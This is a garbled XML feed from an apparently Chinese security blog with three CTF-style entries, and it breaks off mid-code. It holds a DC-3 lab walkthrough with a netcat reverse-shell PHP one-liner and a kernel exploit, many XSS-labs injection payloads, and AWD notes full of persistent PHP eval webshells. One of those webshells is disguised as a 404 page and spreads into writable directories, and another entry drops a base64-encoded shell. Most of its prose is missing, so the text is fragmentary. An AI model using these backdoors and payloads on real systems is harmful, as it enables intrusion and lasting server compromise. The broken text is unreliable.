        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id="dirb"><a href="#dirb" class="headerlink" title="dirb"></a>dirb</h3><p>dirb<br></p><blockquote><p>dirb <url_base> [&lt;wordlist_file(s)&gt;] [options]<br>-a user-agent<br>-p &lt;proxy[:port]&gt;<br>-c cookie<br>-z <br>-o <br>-X <br>-H <br>-i </p></blockquote><p><a href="https://xz.aliyun.com/t/3958">John the Ripper</a></p><h3 id="searchsploit-"><a href="#searchsploit-" class="headerlink" title="searchsploit "></a>searchsploit </h3><p>searchsploitExploit-DB<br></p><p><img src="https://img-blog.csdnimg.cn/f6ff9033f2e14dd9a0d739b36280842c.png" alt="1"></p><p></p><blockquote><p><code>cp /usr/share/exploitdb/exploits/php/webapps/42033.txt ./Desktop/</code></p></blockquote><p>POCsqlmap</p><h3 id="john"><a href="#john" class="headerlink" title="john"></a>john</h3><p>txt<br>john 1.txt<br><img src="https://img-blog.csdnimg.cn/b06439e17edc43c8984860f6c30511ee.png" alt="2"><br><br><img src="https://img-blog.csdnimg.cn/a276bfdc2f1a4d4dba03be0f85a5102c.png" alt="3"></p><p>shell</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /etc/issue<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/78e3b21b476f4f90907e7c8a09de5f7b.png" alt="2"><br></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">uname</span> <span class="token parameter variable">-a</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img-blog.csdnimg.cn/eb314af17f7848ff968aa5a820a7ab5e.png" alt="2"></p><blockquote><ul><li>LinuxLinux</li><li>DC-3</li><li>4.4.0-21-genericLinux4.4.0-21-generic</li><li>#37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 20162016418183449Ubuntu37SMP</li><li>i686 i686 i686CPUi68632x86</li><li>GNU&#x2F;LinuxGNU&#x2F;LinuxGNU</li></ul></blockquote><p>shell</p><blockquote><p>kali:<code>nc -lnvp 6666</code><br>:PHP<br><code>&lt;?php system(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.206.134 6666 &gt;/tmp/f&#39;);?&gt;  </code></p></blockquote><p>wgetzip</p><blockquote><p>unzip 39772.zip<br>tar -xvf exploit.tar<br>cd ebpf*<br>.&#x2F;compile.sh<br>.&#x2F;doubleput</p></blockquote><p>root</p>]]></content>
      
      
      <categories>
          
          <category>  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS</title>
      <link href="/2023/07/22/XSS%E6%80%BB%E7%BB%93/"/>
      <url>/2023/07/22/XSS%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><ul><li><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id="leval3"><a href="#leval3" class="headerlink" title="leval3"></a>leval3</h3><p>leval2<strong>htmlspecialchars</strong></p><blockquote><p><code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p></blockquote><p>level4<strong>htmlspecialchars</strong></p><blockquote><p><br>htmlspecialchars()  HTML <br><img src="https://img-blog.csdnimg.cn/5e76f1783f0b4526a25482dc6c9d664a.png" alt="1"></p></blockquote><p><strong></strong>valueonclick</p><blockquote><p><code>&#39;onclick=&#39;alert(1)</code></p></blockquote><p><br><img src="https://img-blog.csdnimg.cn/0587c61ee365484b930177737361d966.png" alt="1"><br></p><blockquote><p><code>&lt;input name=keyword  value=&#39;&#39;onclick=&#39;alert(1)&#39;&gt;</code></p></blockquote><p><code>&lt;input</code>onclick</p><blockquote><p><code>&lt;input onclick=alert(11) &gt;</code></p></blockquote><h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><p><br><strong>htmlspecialchars</strong><code>&lt;&gt;</code><br><img src="https://img-blog.csdnimg.cn/474c4cee9e9b47a3994c148fdbe5c6fe.png" alt="1"></p><h3 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h3><p><img src="https://img-blog.csdnimg.cn/8a3a29c1c49e4dbe89bc5097276b2b3e.png" alt="1"><br><code>&quot;&gt;&lt;input+onclick=alert(1)+&gt;//</code>&#x3D;&#x3D;$str&#x3D;&#x3D;<br><img src="https://img-blog.csdnimg.cn/982889f914994b1288a26c6cb160f3bb.png" alt="1"><br><code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;</code></p><blockquote><p><code>&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;</code></p></blockquote><p><br><img src="https://img-blog.csdnimg.cn/a8b6e357809a4cdba1c029dcc69f52d1.png" alt="2"></p><h3 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h3><p><img src="https://img-blog.csdnimg.cn/a0faa242e1004d579d0f14dbd48dd765.png" alt="1"><br></p><h3 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h3><p><img src="https://img-blog.csdnimg.cn/9e4a5df41dc247d48a4edbd017e9ddea.png" alt="7"></p><p></p><h3 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h3><p><img src="https://img-blog.csdnimg.cn/3adc192c19c94ffbb650b184fa0aab12.png" alt="8"></p><p>html<br><code>javascript:alert(1)</code><code>&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;</code></p><h3 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h3><p><img src="https://img-blog.csdnimg.cn/e67c47475bd44f05996b85c6d4e9fc22.png" alt="9"><br>**http:&#x2F;&#x2F;**<code>alert(&#39;http://&#39;)</code></p><h3 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h3><p><img src="https://img-blog.csdnimg.cn/2a3dd15e795d4ba78017674caccc51d2.png" alt="1"><br><br><img src="https://img-blog.csdnimg.cn/fe7ebe0e305f47e1a721ac46ab3e3ba9.png" alt="2"><br><strong>t_sort</strong><code>&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;</code></p><ul><li><code>&lt;input&gt;</code>t_link<code>$str33</code></li></ul><p>inputhtmlaccesskey</p><ul><li><p>accesskey  HTML global attributeaccess keyfocus<br> accesskey  Windows  Alt  +  macOS  Control  + </p></li><li><p>accesskey HTML</p></li></ul><p> accesskey </p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>accesskey <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span> Alt + G  Google <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://www.google.com<span class="token punctuation">"</span></span> <span class="token attr-name">accesskey</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>g<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Google<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span> Alt + S <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>search<span class="token punctuation">"</span></span> <span class="token attr-name">accesskey</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>s<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Search<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> accesskey </p><p><code>t_sort=2&quot; accesskey=&quot;x&quot; onclick=&quot;alert(1)&quot; type=&quot;text&quot;</code></p><h3 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h3><p><img src="https://img-blog.csdnimg.cn/3084e320d4da420281756af0ea730012.png" alt="11"></p><p>bpreferer</p><blockquote><p><code>REFERER: &quot; type=&quot;text&quot; onclick=&quot;alert(&#39;xss&#39;)</code></p></blockquote><p><strong>level12</strong><br>UA<br><strong>level13</strong><br>cookie</p><h3 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h3><p><img src="https://img-blog.csdnimg.cn/afbe4c0cc5e547b989e0ee4a26074f81.png" alt="1"><br>**<a href="https://www.runoob.com/angularjs/ng-ng-include.html">ng-include</a>**<br><img src="https://img-blog.csdnimg.cn/b5fabf566c78432b89a29ede76c26f8e.png" alt="2"><br>level1</p><blockquote><p><code>http://127.0.0.1:2000/xss-labs/level15.php?src=&#39;level1.php?name=&lt;img src=asd onerror=alert(1) &gt;&#39;</code></p></blockquote><p><strong>level16</strong><br></p><blockquote><p><code>&lt;img%0asrc=x%0aonerror=alert(123)&gt;</code></p></blockquote><h3 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h3><p><img src="https://img-blog.csdnimg.cn/7cc9b86cc21f419db6105b9bcea138f8.png" alt="123"></p><ul><li><p><code>&lt;embed&gt;</code><code>&lt;embed&gt;</code>HTMLFlash</p></li><li><p><code>src</code><code>&lt;embed&gt;</code>URL</p></li><li><p><code>&quot;xsf01.swf?&quot;</code>src</p></li></ul><p>html</p><blockquote><p><code>arg01=11&amp;arg02=1 onmousedown=alert(1)</code><br><code>arg01=11&amp;arg02=1 onmouseover=alert(1)</code></p></blockquote><p>onmousexxx<br><img src="https://img-blog.csdnimg.cn/2a085af5a34e4826b149e8f06e710200.png" alt="3"></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><blockquote><p><code>&lt;img src=1 onerror=alert(1)&gt;</code></p></blockquote><ul><li><code>&lt;img&gt;</code>: HTMLXSS</li><li><code>src=1</code>: src<code>&lt;img&gt;</code>URLURL1URL</li><li><code>onerror=alert(1)</code>: XSS<code>onerror</code>JavaScriptJavaScript<code>alert(1)</code>1</li></ul><blockquote><p><code>&lt;input onclick=alert(1)&gt;</code></p></blockquote><ul><li><p><code>&lt;input&gt;</code>HTML</p></li><li><p><code>onclick=alert(1)</code><input>JavaScriptJavaScript<code>alert(1)</code>1</p></li></ul><blockquote><p><code>&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;</code></p></blockquote><ul><li><p><code>&lt;a&gt;</code>HTML</p></li><li><p><code>href=&quot;javascript:alert(1)&quot;</code><code>&lt;a&gt;</code><code>href</code><code>href</code><code>javascript:alert(1)</code>JavaScript</p></li><li><p><code>alert(1)</code>JavaScript<code>alert()</code>JavaScript1</p></li></ul><blockquote><p><code>&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;</code></p></blockquote><ul><li><code>&lt;input</code>&gt;HTML</li><li><code>name=&quot;t_link&quot;</code><code>&lt;input&gt;</code>t_link</li><li><code>value=&quot;&#39;.&#39;&quot;</code><code>&lt;input&gt;</code><code>&#39;.&#39;</code><br>-<code> type=&quot;hidden&quot;</code><code>&lt;input&gt;</code>hidden</li></ul><blockquote><p><code>&lt;button onmouseover=&quot;alert(1)&quot;&gt;&lt;/button&gt;</code></p></blockquote><ul><li>(<code>&lt;button&gt;</code>) onmouseover  onmouseover  JavaScript  1</li></ul><blockquote><p><code>&lt;input accesskey=&quot;x&quot; onclick=&quot;alert(1)&quot; type=&quot;text&quot;&gt;</code></p></blockquote><ul><li><p><code>accesskey=&quot;x&quot;</code> input  accesskey accesskey&#x3D;x  Alt ( macOS  Control)  + x </p></li><li><p><code>onclick=&quot;alert(1)&quot;</code> input  onclick  JavaScript onclick&#x3D;alert(1)  1</p></li><li><p><code>type=&quot;text&quot;</code> input  type type&#x3D;text </p></li></ul><p><strong></strong></p><ul><li><p>type&#x3D;text: </p></li><li><p>type&#x3D;password: </p></li><li><p>type&#x3D;number: +-</p></li><li><p>type&#x3D;email: </p></li><li><p>type&#x3D;url: URLURL</p></li><li><p>type&#x3D;tel: </p></li><li><p>type&#x3D;date: </p></li><li><p>type&#x3D;time: </p></li><li><p>type&#x3D;color: </p></li><li><p>type&#x3D;checkbox: </p></li><li><p>type&#x3D;radio: </p></li><li><p>type&#x3D;file: </p></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category>  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>awd</title>
      <link href="/2023/07/22/awd%E6%80%BB%E7%BB%93/"/>
      <url>/2023/07/22/awd%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id=""><a href="#" class="headerlink" title=""></a></h3><blockquote><p><br>tar -zcvf <a href="http://www.tar.gz/">www.tar.gz</a> &#x2F;var&#x2F;www&#x2F;*</p></blockquote><blockquote><p><br>tar -zxvf <a href="http://www.tar.gz/">www.tar.gz</a><br><br>tar -zcf &#x2F;tmp&#x2F;name.tar.gz &#x2F;path&#x2F;web<br>tar -zcf &#x2F;tmp&#x2F;name.tar.gz &#x2F;var&#x2F;www&#x2F;html</p></blockquote><h3 id="waf"><a href="#waf" class="headerlink" title="waf"></a>waf</h3><p># waf &#x2F;var&#x2F;www&#x2F;html&#x2F;  php  <?php require_once "/tmp/waf.php";?></p><blockquote><p>find &#x2F;var&#x2F;www&#x2F;html&#x2F; -path &#x2F;var&#x2F;www&#x2F;html&#x2F;513666 -prune -o  -type f -name *.php|xargs  sed -i 1i<?php require_once "/tmp/waf.php";?></p></blockquote><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>1.ps aux|grep shell.php pidphpopcode</p><p>2.phpweb(root)</p><p>3.ignore_user_abort(true)usleep</p><p>4.</p><p>5.<code>pkill -u www-data</code></p><p>6.<br> </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token assign-left variable">dire</span><span class="token operator">=</span><span class="token string">"/var/www/html/.base.php/"</span><span class="token assign-left variable">file</span><span class="token operator">=</span><span class="token string">"/var/www/html/.base.php"</span><span class="token function">rm</span> <span class="token parameter variable">-rf</span> <span class="token variable">$file</span><span class="token function">mkdir</span> <span class="token variable">$dire</span>./xx.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id=""><a href="#" class="headerlink" title=""></a></h3><blockquote><p>find &#x2F;var&#x2F;www&#x2F;html -name 1.php -delete</p></blockquote><h3 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h3><p></p><p><code>sh sh.sh</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token keyword">while</span> <span class="token boolean">true</span><span class="token keyword">do</span>    <span class="token function">find</span> /app/ <span class="token parameter variable">-cmin</span> <span class="token parameter variable">-60</span> <span class="token parameter variable">-type</span> f <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span>    <span class="token function">sleep</span> <span class="token number">1</span><span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><p><code>select &quot;&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;&quot; into outfile &quot;D:\\phpstudy_pro\\WWW\\shell.php&quot;</code></p><h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><pre class="line-numbers language-none"><code class="language-none">select load_file(&quot;E:\\flag.txt&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="1-flag-"><a href="#1-flag-" class="headerlink" title="1.flag()"></a>1.flag()</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">'http://10a6eb1a-ee99-4562-8d4d-cefa0de4c770.challenge.ctf.show/1.php'</span><span class="token comment">#ip</span>payload<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string">'45'</span><span class="token punctuation">:</span><span class="token string">'system(\'cat flag.php\');'</span><span class="token punctuation">&#125;</span>r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>payload<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>encoding<span class="token operator">=</span>r<span class="token punctuation">.</span>apparent_encoding<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p></p><p>flag</p><h3 id="2-1"><a href="#2-1" class="headerlink" title="2.1"></a>2.1</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">ignore_user_abort</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">unlink</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'.git.php'</span><span class="token punctuation">;</span><span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php @eval($_POST[\'ctf\']) ?>'</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'touch -m -d "2018-12-01 09:10:12" .git.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">usleep</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token function">ignore_user_abort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//PHP.</span>  <span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//set_time_limit(0)</span>  <span class="token variable">$interval</span> <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span> <span class="token comment">// *</span><span class="token keyword">do</span> <span class="token punctuation">&#123;</span>  <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'.123.php'</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".123.php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php if(md5($_POST["ctf"])=="2c3b3b52eb833ba66134aa1b3970b391")&#123;@eval($_POST[a]);&#125; ?>\n'</span><span class="token punctuation">;</span>  <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token variable">$interval</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>    2c3b3b52eb833ba66134aa1b3970b391ag@ctf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">ignore_user_abort</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">unlink</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'.git.php'</span><span class="token punctuation">;</span><span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php if(md5($_POST["ctf"])=="2c3b3b52eb833ba66134aa1b3970b391")&#123;@eval($_POST[a]);&#125; ?>'</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">usleep</span><span class="token punctuation">(</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span>    2c3b3b52eb833ba66134aa1b3970b391ag@ctf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4404"><a href="#4404" class="headerlink" title="4404"></a>4404</h3><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;!DOCTYPE HTML PUBLIC &quot;-&#x2F;&#x2F;IETF&#x2F;&#x2F;DTD HTML 2.0&#x2F;&#x2F;EN&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;404 Not Found&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;h1&gt;Not Found&lt;&#x2F;h1&gt;&lt;p&gt;The requested URL was not found on this server.&lt;&#x2F;p&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;&lt;?php if(md5($_POST[&quot;ctf&quot;])&#x3D;&#x3D;&quot;2c3b3b52eb833ba66134aa1b3970b391&quot;)&#123;@eval($_POST[a]);&#125; ?&gt;2c3b3b52eb833ba66134aa1b3970b391ag@ctf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&lt;?phpheader(&quot;Content-Type:text&#x2F;html;charset&#x3D;utf-8&quot;);ignore_user_abort(true);set_time_limit(0);#unlink(__FILE__);  &#x2F;&#x2F;$paths&#x3D;&#96;find &#x2F;var&#x2F;www&#x2F;html -type d -writable&#96;;$paths&#x3D;explode(&quot;\n&quot;,$paths);array_pop($paths);$url &#x3D; $_REQUEST[&quot;url&quot;];$pass &#x3D; &quot;2c3b3b52eb833ba66134aa1b3970b391&quot;;$filename &#x3D; $_REQUEST[&quot;filename&quot;];echo &quot;&lt;!DOCTYPE HTML PUBLIC &#39;-&#x2F;&#x2F;IETF&#x2F;&#x2F;DTD HTML 2.0&#x2F;&#x2F;EN&#39;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;404 Not Found&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;h1&gt;Not Found&lt;&#x2F;h1&gt;&lt;p&gt;The requested URL was not found on this server.&lt;&#x2F;p&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;\n&quot;;function self()&#123;    $self&#x3D;substr($_SERVER[&#39;PHP_SELF&#39;],strrpos($_SERVER[&#39;PHP_SELF&#39;],&#39;&#x2F;&#39;)+1);    return $self;  &#125;if($_REQUEST[&quot;m&quot;]&#x3D;&#x3D;&quot;czy&quot;)&#123;        if(md5($_REQUEST[&quot;pass&quot;]) &#x3D;&#x3D; $pass)&#123;            echo file_get_contents(&#39;.&#x2F;flag&#39;);            eval($_REQUEST[&#39;A&#39;]);        &#125;&#125;&#x2F;*if(&quot;1&quot;!&#x3D;&quot;2&quot;)&#123;        #while(1)&#123;        if(count($paths)!&#x3D;&#x3D;0)        &#123;                foreach ($paths as $path) &#123;                        @file_put_contents($path.&quot;&#x2F;.config.php&quot;,file_get_contents(self()));                        @file_put_contents($path.&quot;&#x2F;-config.php&quot;,file_get_contents(self()));                &#125;        &#125;&#125;#&#125;*&#x2F;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload&gt;POST</p><p><strong>m&#x3D;czy&amp;pass&#x3D;ag@ctf</strong></p><p>php</p><h3 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h3><blockquote><p>system(echo PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2N0ZiddKTsgPz4&#x3D;|base64 -d&gt;&gt;.513.php);</p><p>payload:post</p><p>ctf&#x3D;***</p></blockquote><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> /var/www/html/ <span class="token parameter variable">-path</span> /var/www/html/513666 <span class="token parameter variable">-prune</span> <span class="token parameter variable">-o</span>  <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> <span class="token string">'*.php'</span><span class="token operator">|</span><span class="token function">xargs</span>  <span class="token 